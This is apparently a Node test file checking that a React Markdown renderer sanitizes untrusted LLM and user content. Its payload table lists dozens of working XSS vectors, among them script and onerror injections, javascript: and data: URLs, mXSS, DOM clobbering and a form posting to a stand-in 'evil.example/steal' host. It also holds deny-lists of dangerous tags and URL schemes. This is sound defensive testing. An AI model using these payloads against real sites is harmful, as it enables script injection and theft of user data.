/**
 * MarkdownRenderer sanitization tests.
 *
 * LLM output, participant messages and stored prompt context all reach the
 * browser through <MarkdownRenderer>. These tests render the REAL component
 * (bundled with esbuild, rendered with react-dom/server) and inspect the
 * resulting DOM structurally with parse5, so payload text that is merely
 * displayed (for example inside a code fence) is not mistaken for markup.
 *
 * Run: npm run test:markdown
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { build } from 'esbuild';
import { parseFragment } from 'parse5';

const reactRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const srcRoot = path.join(reactRoot, 'src');
const nodeRequire = createRequire(import.meta.url);

// mediaPath.ts reads window.BASE_PATH when it resolves an asset path.
globalThis.window = globalThis.window || {};

async function loadRenderer() {
  const result = await build({
    stdin: {
      contents: `
        import React from 'react';
        import { renderToStaticMarkup } from 'react-dom/server';
        import { unified } from 'unified';
        import remarkParse from 'remark-parse';
        import remarkGfm from 'remark-gfm';
        import remarkRehype from 'remark-rehype';
        import rehypeRaw from 'rehype-raw';
        import rehypeSanitize from 'rehype-sanitize';
        import { MarkdownRenderer } from './src/components/styles/shared/MarkdownRenderer';
        import { markdownSanitizeSchema } from './src/components/styles/shared/markdownSanitizeSchema';

        // The full component, as users see it.
        export const render = (content) =>
          renderToStaticMarkup(React.createElement(MarkdownRenderer, { content }));

        // Only the raw-HTML stage + the shared schema: no react-markdown urlTransform and no
        // renderer components, so this proves the schema is a guard on its own.
        export const sanitizeOnly = (content) => {
          const processor = unified()
            .use(remarkParse)
            .use(remarkGfm)
            .use(remarkRehype, { allowDangerousHtml: true })
            .use(rehypeRaw)
            .use(rehypeSanitize, markdownSanitizeSchema);
          return processor.runSync(processor.parse(content));
        };
      `,
      resolveDir: reactRoot,
      loader: 'ts',
      sourcefile: 'markdown-renderer-entry.ts',
    },
    bundle: true,
    platform: 'node',
    format: 'cjs',
    write: false,
    jsx: 'automatic',
    logLevel: 'silent',
    define: { 'process.env.NODE_ENV': '"production"' },
  });
  const mod = { exports: {} };
  new Function('module', 'exports', 'require', result.outputFiles[0].text)(
    mod,
    mod.exports,
    nodeRequire
  );
  return mod.exports;
}

const { render, sanitizeOnly } = await loadRenderer();

/* ----------------------------- DOM helpers ----------------------------- */

function walk(node, visit) {
  visit(node);
  for (const child of node.childNodes || []) walk(child, visit);
  if (node.content) walk(node.content, visit);
}

function elements(html) {
  const out = [];
  walk(parseFragment(html), (node) => {
    if (node.tagName) out.push(node);
  });
  return out;
}

function attr(el, name) {
  const found = (el.attrs || []).find((a) => a.name === name);
  return found ? found.value : undefined;
}

function textOf(html) {
  let text = '';
  walk(parseFragment(html), (node) => {
    if (node.nodeName === '#text') text += node.value;
  });
  return text;
}

const FORBIDDEN_TAGS = new Set([
  'script', 'iframe', 'frame', 'frameset', 'object', 'embed', 'applet', 'form',
  'style', 'svg', 'math', 'link', 'meta', 'base', 'textarea', 'select', 'option',
  'template', 'noscript', 'portal', 'dialog',
]);
const URL_ATTRS = ['href', 'src', 'srcset', 'action', 'formaction', 'data', 'poster', 'xlink:href', 'background', 'cite', 'longdesc'];
// Inline styles the renderer's own media components set (never from the payload).
const COMPONENT_STYLES = {
  img: 'max-height:400px',
  video: 'max-width:100%;max-height:400px',
};

/** Fail when the rendered HTML contains anything that can run script or escape the message box. */
function assertInert(html, label) {
  for (const el of elements(html)) {
    assert.ok(!FORBIDDEN_TAGS.has(el.tagName), `${label}: forbidden <${el.tagName}> rendered`);
    for (const { name, value } of el.attrs || []) {
      assert.ok(!/^on/i.test(name), `${label}: event handler attribute ${name} on <${el.tagName}>`);
      if (name === 'style') {
        assert.equal(
          value,
          COMPONENT_STYLES[el.tagName],
          `${label}: style="${value}" on <${el.tagName}> did not come from a renderer component`
        );
      }
      if (URL_ATTRS.includes(name)) {
        const compact = value.replace(/[\u0000-\u0020\u007f-\u009f]/g, '').toLowerCase();
        assert.ok(
          !/^(javascript|vbscript|data|livescript|mocha):/.test(compact),
          `${label}: dangerous ${name}="${value}" on <${el.tagName}>`
        );
      }
      if (name === 'id' || name === 'name') {
        assert.ok(
          value.startsWith('user-content-'),
          `${label}: un-prefixed ${name}="${value}" could clobber page globals`
        );
      }
    }
    // The only button the renderer itself produces is the code-copy button.
    if (el.tagName === 'button') {
      assert.match(attr(el, 'class') || '', /code-copy-btn/, `${label}: unexpected <button>`);
    }
  }
}

/* ------------------------------ XSS payloads --------------------------- */

const PAYLOADS = {
  'script tag': '<script>alert(1)</script>',
  'script in paragraph': 'hello <script>alert(document.cookie)</script> world',
  'img onerror': '<img src=x onerror=alert(1)>',
  'img onerror uppercase': '<IMG SRC=x ONERROR=alert(1)>',
  'img onerror quoted': '<img src="x" onerror="alert(1)" alt="y">',
  'svg onload': '<svg onload=alert(1)></svg>',
  'svg with script': '<svg><script>alert(1)</script></svg>',
  'math mxss': '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
  'iframe javascript': '<iframe src="javascript:alert(1)"></iframe>',
  'iframe srcdoc': '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  'object data': '<object data="javascript:alert(1)"></object>',
  'embed src': '<embed src="javascript:alert(1)">',
  'anchor javascript': '<a href="javascript:alert(1)">x</a>',
  'anchor javascript mixed case': '<a href="JaVaScRiPt:alert(1)">x</a>',
  'anchor javascript tab': '<a href="java&#x09;script:alert(1)">x</a>',
  'anchor javascript entity': '<a href="&#106;avascript:alert(1)">x</a>',
  'anchor javascript leading space': '<a href=" javascript:alert(1)">x</a>',
  'anchor vbscript': '<a href="vbscript:msgbox(1)">x</a>',
  'anchor data html': '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  'anchor onmouseover': '<a href="https://example.com" onmouseover="alert(1)">x</a>',
  'markdown link javascript': '[x](javascript:alert(1))',
  'markdown link javascript spaced': '[x]( javascript:alert(1))',
  'markdown link javascript angle': '[x](<javascript:alert(1)>)',
  'markdown link data': '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  'markdown image javascript': '![x](javascript:alert(1))',
  'markdown image onerror title': '![x](https://example.com/a.png "t\\" onerror=\\"alert(1)")',
  'img src javascript': '<img src="javascript:alert(1)">',
  'img srcset javascript': '<img src="https://example.com/a.png" srcset="javascript:alert(1) 1x">',
  'form action': '<form action="https://evil.example/steal"><input name="q"><button>Go</button></form>',
  'button formaction': '<form><button formaction="javascript:alert(1)">x</button></form>',
  'input autofocus': '<input autofocus onfocus=alert(1)>',
  'input type image': '<input type="image" src="x" onerror="alert(1)">',
  'details ontoggle': '<details open ontoggle=alert(1)>x</details>',
  'video source onerror': '<video><source src="x" onerror="alert(1)"></video>',
  'audio onerror': '<audio src=x onerror=alert(1)></audio>',
  'meta refresh': '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  'link stylesheet': '<link rel="stylesheet" href="//evil.example/x.css">',
  'base href': '<base href="//evil.example/">',
  'style block': '<style>body{display:none}</style>',
  'style attribute overlay':
    '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff" onclick="alert(1)">overlay</div>',
  'textarea': '<textarea autofocus onfocus=alert(1)></textarea>',
  'split tag': '<scr<script>ipt>alert(1)</scr</script>ipt>',
  'comment break': '<!--><img src=x onerror=alert(1)>-->',
  'dom clobbering name': '<img name="getElementById" src="https://example.com/a.png">',
  'dom clobbering id': '<a id="defaultView" href="https://example.com">x</a>',
  'noscript': '<noscript><img src=x onerror=alert(1)></noscript>',
  'template': '<template><img src=x onerror=alert(1)></template>',
  'nested in table': '| a |\n|---|\n| <img src=x onerror=alert(1)> |',
  'nested in list': '- item <img src=x onerror=alert(1)>',
  'nested in blockquote': '> <img src=x onerror=alert(1)>',
  'nested in heading': '# <img src=x onerror=alert(1)>',
};

for (const [label, payload] of Object.entries(PAYLOADS)) {
  test(`payload is inert: ${label}`, () => {
    assertInert(render(payload), label);
  });
}

/* ------------- the schema on its own (second layer of defense) ---------- */

const HAST_FORBIDDEN_TAGS = new Set([...FORBIDDEN_TAGS, 'button']);
const HAST_URL_PROPS = ['href', 'src', 'srcSet', 'action', 'formAction', 'data', 'poster', 'cite', 'longDesc', 'background', 'xLinkHref'];

function hastElements(tree) {
  const out = [];
  (function visit(node) {
    if (node.type === 'element') out.push(node);
    (node.children || []).forEach(visit);
  })(tree);
  return out;
}

/** The sanitized syntax tree must hold nothing executable even before react-markdown/our components touch it. */
function assertInertHast(tree, label) {
  for (const el of hastElements(tree)) {
    assert.ok(!HAST_FORBIDDEN_TAGS.has(el.tagName), `${label}: forbidden <${el.tagName}> survived the schema`);
    for (const [name, raw] of Object.entries(el.properties || {})) {
      assert.ok(!/^on/i.test(name), `${label}: ${name} survived on <${el.tagName}>`);
      assert.notEqual(name, 'style', `${label}: style survived on <${el.tagName}>`);
      if (HAST_URL_PROPS.includes(name)) {
        const value = Array.isArray(raw) ? raw.join(' ') : String(raw);
        const compact = value.replace(/[\u0000-\u0020\u007f-\u009f]/g, '').toLowerCase();
        assert.ok(
          !/^(javascript|vbscript|data|livescript|mocha):/.test(compact),
          `${label}: ${name}="${value}" survived on <${el.tagName}>`
        );
      }
      if (name === 'id' || name === 'name') {
        assert.ok(String(raw).startsWith('user-content-'), `${label}: un-prefixed ${name}="${raw}"`);
      }
    }
  }
}

for (const [label, payload] of Object.entries(PAYLOADS)) {
  test(`schema alone neutralizes: ${label}`, () => {
    assertInertHast(sanitizeOnly(payload), label);
  });
}

test('schema alone keeps safe attributes and drops unknown ones', () => {
  const tree = sanitizeOnly('<a href="https://example.com" onclick="x()" class="btn" data-x="1">ok</a>');
  const a = hastElements(tree).find((el) => el.tagName === 'a');
  assert.equal(a.properties.href, 'https://example.com');
  // The allow-list leaves an emptied className behind; no class from the payload survives.
  assert.deepEqual(a.properties.className ?? [], []);
  assert.deepEqual(Object.keys(a.properties).filter((k) => k !== 'className'), ['href']);
});

test('schema alone removes layout classes so raw HTML cannot build overlays', () => {
  const tree = sanitizeOnly('<span class="position-fixed text-danger">x</span><div class="modal-backdrop">y</div>');
  const els = hastElements(tree).filter((el) => el.tagName === 'span' || el.tagName === 'div');
  assert.equal(els.length, 2);
  for (const el of els) assert.deepEqual(el.properties, {});
});

test('<style> text is dropped instead of being printed', () => {
  const html = render('before <style>body{display:none}</style> after');
  assert.ok(!textOf(html).includes('display:none'), 'CSS source leaked into the message text');
  assert.match(textOf(html), /before\s+after/);
});

test('<script> content is dropped', () => {
  const html = render('a <script>window.__pwned = 1</script> b');
  assert.ok(!textOf(html).includes('__pwned'));
});

test('payload shown inside a code fence is text, not markup', () => {
  const html = render('```html\n<img src=x onerror=alert(1)>\n<script>alert(1)</script>\n```');
  assertInert(html, 'code fence');
  assert.ok(textOf(html).includes('<script>alert(1)</script>'), 'code sample should stay visible as text');
  assert.ok(!elements(html).some((el) => el.tagName === 'img'), 'fenced <img> must not become an element');
});

test('payload shown inside inline code is text, not markup', () => {
  const html = render('use `<img src=x onerror=alert(1)>` carefully');
  assertInert(html, 'inline code');
  assert.ok(textOf(html).includes('<img src=x onerror=alert(1)>'));
});

test('ids and names from raw HTML are prefixed so they cannot clobber page globals', () => {
  // <a> and <img> go through renderer components that drop id/name, so use plain elements.
  const html = render('<div id="defaultView">x</div><span name="getElementById">y</span>');
  const found = elements(html).flatMap((el) => ['id', 'name'].map((n) => attr(el, n)).filter(Boolean));
  assert.deepEqual(found, ['user-content-defaultView', 'user-content-getElementById']);
});

/* -------------------- legitimate Markdown still works ------------------ */

test('emphasis, lists, headings and blockquotes render', () => {
  const html = render('# Title\n\n**bold** and *em*\n\n- one\n- two\n\n1. first\n\n> quote');
  const tags = elements(html).map((el) => el.tagName);
  for (const expected of ['h1', 'strong', 'em', 'ul', 'li', 'ol', 'blockquote']) {
    assert.ok(tags.includes(expected), `missing <${expected}>`);
  }
});

test('GFM tables render inside the responsive wrapper', () => {
  const html = render('| a | b |\n|---|:-:|\n| 1 | 2 |');
  const tags = elements(html).map((el) => el.tagName);
  for (const expected of ['table', 'thead', 'tbody', 'tr', 'th', 'td']) {
    assert.ok(tags.includes(expected), `missing <${expected}>`);
  }
  assert.ok(elements(html).some((el) => (attr(el, 'class') || '').includes('table-responsive')));
});

test('GFM task lists keep checked state and stay disabled', () => {
  const html = render('- [x] done\n- [ ] todo');
  const boxes = elements(html).filter((el) => el.tagName === 'input');
  assert.equal(boxes.length, 2);
  for (const box of boxes) {
    assert.equal(attr(box, 'type'), 'checkbox');
    assert.notEqual(attr(box, 'disabled'), undefined, 'task checkbox must stay disabled');
  }
  assert.equal(boxes.filter((b) => attr(b, 'checked') !== undefined).length, 1);
});

test('renderer components do not leak the react-markdown node into DOM attributes', () => {
  // react-markdown passes its hast `node` to every custom component; spreading the props onto
  // a DOM element would print it as node="[object Object]".
  const html = render('Inline `code` here\n\n```js\nconst x = 1;\n```\n\n```\nplain fence\n```\n\n- [x] done\n- [ ] todo');
  const all = elements(html);
  const tags = all.map((el) => el.tagName);
  assert.ok(tags.includes('code') && tags.includes('input'), 'the sample must render code and task-list inputs');
  for (const el of all) {
    assert.equal(attr(el, 'node'), undefined, `<${el.tagName}> carries a node attribute`);
    for (const { name, value } of el.attrs || []) {
      assert.ok(!value.includes('[object Object]'), `<${el.tagName} ${name}> holds a stringified object`);
    }
  }
});

const hasClass = (el, name) => (attr(el, 'class') || '').split(/\s+/).includes(name);

function textInside(el) {
  let text = '';
  walk(el, (node) => {
    if (node.nodeName === '#text') text += node.value;
  });
  return text;
}

test('inline code is an inline <code> inside its paragraph, not a code block', () => {
  // react-markdown v9 passes no `inline` prop: without the <pre> marker every `code` used to
  // render as a block (div.code-block-wrapper with a copy button) nested inside the <p>.
  const html = render('Use `npm run build` to build, then `npm test`.');
  const all = elements(html);
  const codes = all.filter((el) => el.tagName === 'code');
  assert.deepEqual(codes.map(textInside), ['npm run build', 'npm test']);
  for (const code of codes) {
    assert.equal(code.parentNode.tagName, 'p', 'inline code must sit directly in the paragraph');
    assert.ok(hasClass(code, 'inline-code'), 'inline code keeps the inline-code class');
  }
  assert.ok(!all.some((el) => el.tagName === 'pre'), 'no <pre> for inline code');
  assert.ok(!all.some((el) => hasClass(el, 'code-block-wrapper')), 'no code-block wrapper for inline code');
  assert.ok(!all.some((el) => hasClass(el, 'code-copy-btn')), 'no copy button for inline code');
  assert.equal(all.filter((el) => el.tagName === 'p').length, 1, 'the sentence stays one paragraph');
  assert.equal(textOf(html), 'Use npm run build to build, then npm test.');
});

test('fenced and indented code stay code blocks with a copy button', () => {
  const samples = {
    'fenced with language': '```js\nconst x = 1;\n```',
    'fenced without language': '```\nplain fence\n```',
    indented: 'text\n\n    indented code\n',
  };
  for (const [name, markdown] of Object.entries(samples)) {
    const all = elements(render(markdown));
    const code = all.find((el) => el.tagName === 'code');
    assert.ok(code, `${name}: <code> missing`);
    assert.equal(code.parentNode.tagName, 'pre', `${name}: block code sits in a <pre>`);
    assert.ok(all.some((el) => hasClass(el, 'code-block-wrapper')), `${name}: code-block wrapper missing`);
    assert.ok(all.some((el) => hasClass(el, 'code-copy-btn')), `${name}: copy button missing`);
    assert.ok(!all.some((el) => hasClass(el, 'inline-code')), `${name}: must not render as inline code`);
  }
});

test('raw <pre><code> HTML renders as a block, a lone <code> as inline', () => {
  const block = elements(render('<pre><code>raw block</code></pre>'));
  assert.ok(block.some((el) => hasClass(el, 'code-block-wrapper')), 'raw <pre><code> is a code block');
  assert.ok(!block.some((el) => hasClass(el, 'inline-code')));

  const inline = elements(render('plain <code>raw inline</code> text'));
  const code = inline.find((el) => el.tagName === 'code');
  assert.ok(code && hasClass(code, 'inline-code'), 'raw <code> outside a <pre> is inline code');
  assert.ok(!inline.some((el) => hasClass(el, 'code-block-wrapper')));

  // A <pre> whose child is plain text (no <code>) must not break the marker
  assert.ok(textOf(render('<pre>kept as text</pre>')).includes('kept as text'));
});

test('a message with inline code and a code block renders both correctly', () => {
  const html = render('Run `ls` first:\n\n```sh\nls -la\n```\n\nThen `exit`.');
  const all = elements(html);
  const inline = all.filter((el) => el.tagName === 'code' && hasClass(el, 'inline-code'));
  assert.deepEqual(inline.map(textInside), ['ls', 'exit']);
  assert.equal(all.filter((el) => hasClass(el, 'code-block-wrapper')).length, 1, 'exactly one code block');
  assert.equal(all.filter((el) => hasClass(el, 'code-copy-btn')).length, 1, 'exactly one copy button');
  assert.equal(all.filter((el) => el.tagName === 'pre').length, 1);
  assert.equal(all.filter((el) => el.tagName === 'p').length, 2, 'two paragraphs; the code block is not one of them');
});

test('fenced code keeps its language class and is syntax highlighted', () => {
  const html = render('```js\nconst x = 1;\n```');
  const code = elements(html).find((el) => el.tagName === 'code');
  assert.ok(code, 'missing <code>');
  assert.match(attr(code, 'class') || '', /language-js/);
  assert.ok(
    elements(html).some((el) => el.tagName === 'span' && /hljs-/.test(attr(el, 'class') || '')),
    'highlight.js classes must survive (sanitize has to run before rehype-highlight)'
  );
  assert.ok(elements(html).some((el) => (attr(el, 'class') || '').includes('code-copy-btn')));
});

test('external links open in a new tab with noopener', () => {
  const html = render('[site](https://example.com/page)');
  const a = elements(html).find((el) => el.tagName === 'a');
  assert.equal(attr(a, 'href'), 'https://example.com/page');
  assert.equal(attr(a, 'target'), '_blank');
  assert.match(attr(a, 'rel') || '', /noopener/);
});

test('mailto and relative links are kept', () => {
  const html = render('[mail](mailto:help@example.com) [rel](/page/help) [anchor](#top)');
  const hrefs = elements(html).filter((el) => el.tagName === 'a').map((el) => attr(el, 'href'));
  assert.deepEqual(hrefs, ['mailto:help@example.com', '/page/help', '#top']);
});

test('images keep src, alt and title', () => {
  const html = render('![A cat](https://example.com/cat.png "Cat")');
  const img = elements(html).find((el) => el.tagName === 'img');
  assert.equal(attr(img, 'src'), 'https://example.com/cat.png');
  assert.equal(attr(img, 'alt'), 'A cat');
  assert.equal(attr(img, 'title'), 'Cat');
});

test('video and audio markdown still render through the media components', () => {
  const video = render('![video:controls](https://example.com/clip.mp4)');
  assert.ok(elements(video).some((el) => el.tagName === 'video' && attr(el, 'src') === 'https://example.com/clip.mp4'));
  const audio = render('![audio:controls](https://example.com/clip.mp3)');
  assert.ok(elements(audio).some((el) => el.tagName === 'audio' && attr(el, 'src') === 'https://example.com/clip.mp3'));
});

test('harmless inline HTML still renders', () => {
  const html = render('line one<br>line two <sub>2</sub> <kbd>Ctrl</kbd>\n\n<details><summary>More</summary>hidden text</details>');
  const tags = elements(html).map((el) => el.tagName);
  for (const expected of ['br', 'sub', 'kbd', 'details', 'summary']) {
    assert.ok(tags.includes(expected), `missing <${expected}>`);
  }
});

test('the default blocked-message markdown renders as formatted text', () => {
  const html = render(
    "I noticed some concerning content.\n\n**Please consider reaching out to:**\n- A trusted friend\n- A mental health professional\n\n*Take care.*"
  );
  const tags = elements(html).map((el) => el.tagName);
  assert.ok(tags.includes('strong') && tags.includes('ul') && tags.includes('em'));
  assert.ok(!textOf(html).includes('**'), 'markdown markers must not be shown literally');
});

/* ------------------------------ source guard --------------------------- */

function sourceFiles(dir) {
  const out = [];
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) out.push(...sourceFiles(full));
    else if (/\.(ts|tsx)$/.test(entry.name)) out.push(full);
  }
  return out;
}

test('no source file injects raw HTML with dangerouslySetInnerHTML', () => {
  const offenders = sourceFiles(srcRoot).filter((file) =>
    /dangerouslySetInnerHTML/.test(fs.readFileSync(file, 'utf8'))
  );
  assert.deepEqual(
    offenders.map((f) => path.relative(srcRoot, f)),
    [],
    'render untrusted text through MarkdownRenderer (sanitized) or as plain text instead'
  );
});

test('rehype-raw is only used together with rehype-sanitize, and sanitize runs before highlight', () => {
  const users = sourceFiles(srcRoot).filter((file) =>
    /from\s+['"]rehype-raw['"]/.test(fs.readFileSync(file, 'utf8'))
  );
  assert.deepEqual(users.map((f) => path.relative(srcRoot, f).replace(/\\/g, '/')), [
    'components/styles/shared/MarkdownRenderer.tsx',
  ]);
  const source = fs.readFileSync(users[0], 'utf8');
  const plugins = source.match(/rehypePlugins=\{\[([\s\S]*?)\]\}/);
  assert.ok(plugins, 'rehypePlugins list not found');
  const order = ['rehypeRaw', 'rehypeSanitize', 'rehypeHighlight'].map((name) => plugins[1].indexOf(name));
  assert.ok(order.every((i) => i >= 0), 'rehypeRaw, rehypeSanitize and rehypeHighlight must all be listed');
  assert.ok(order[0] < order[1] && order[1] < order[2], 'order must be raw -> sanitize -> highlight');
  assert.match(
    plugins[1],
    /\[\s*rehypeSanitize\s*,\s*markdownSanitizeSchema\s*\]/,
    'rehypeSanitize must be configured with the shared markdownSanitizeSchema'
  );
});
